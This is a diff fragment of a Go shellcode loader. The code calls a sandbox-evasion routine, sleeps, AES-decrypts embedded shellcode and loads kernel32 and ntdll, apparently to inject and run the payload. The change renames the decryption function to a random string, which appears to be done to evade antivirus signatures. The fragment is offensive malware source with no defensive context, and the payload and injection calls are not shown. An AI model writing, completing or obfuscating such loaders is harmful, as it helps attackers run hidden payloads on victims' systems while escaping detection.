@@ -19,7 +19,7 @@ func main() {
 	sandbox.See_through()
 	time.Sleep(10 * time.Second)
 
-	shellcode :=sdec(sc)
+	shellcode :=hrwdfkb(sc)
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
@@ -43,7 +43,7 @@ func main() {
 
 }
 
-func sdec(src string)[]byte{
+func hrwdfkb(src string)[]byte{
 	i,_ := strconv.Atoi(Kmode)
 	skey, _ := hex.DecodeString(aeskey)
 	aes:= encrypt.NewAES() // 默认是Cbc 模式
